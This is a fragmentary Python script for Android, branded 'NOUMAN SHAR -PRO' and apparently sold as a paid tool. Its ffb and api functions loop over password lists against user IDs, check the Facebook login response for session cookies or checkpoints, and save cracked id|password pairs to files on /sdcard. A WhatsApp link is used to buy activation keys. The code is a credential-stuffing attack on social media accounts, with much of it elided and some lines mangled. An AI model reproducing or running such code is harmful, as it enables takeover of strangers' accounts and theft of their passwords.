...
----------------------------------------------
 Author    : NOUMAN SHAR 
 Github    : NOUMAN SHAR 1
 Facebook  : NOUMAN SHAR 
 Tool Name : NOUMAN SHAR -PRO
 Type type : PAID
 Version   : 0.0
----------------------------------------------
 NOUMAN SHAR  Pro version 0.0
 For Haters:  nouman back🤞
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                linex()
                                input(' Press enter to back ')
                                os.system('python NOUMAN SHAR .py')
                        elif xd in ['2','02']:
                                import dump
                        dump.Main()
                        elif xd in ['3','03']:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+923206627545&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi Aking Sir, I Need To Buy Your Paid NOUMAN SHAR  PRO Tools Version 0.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python NOUMAN SHAR .py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [NOUMAN SHAR -XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [NOUMAN SHAR -OK] %s | %s'%(ids,pas))
                                open('/sdcard/NOUMAN SHAR -OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [NOUMAN SHAR -CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/NOUMAN SHAR -CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [NOUMAN SHAR -OK] '+ids+' | '+pas+'\033[1;97m')
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/NOUMAN SHAR -OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [NOUMAN SHAR-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/AKING-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [NOUMAN SHAR -OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/NOUMAN SHAR-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
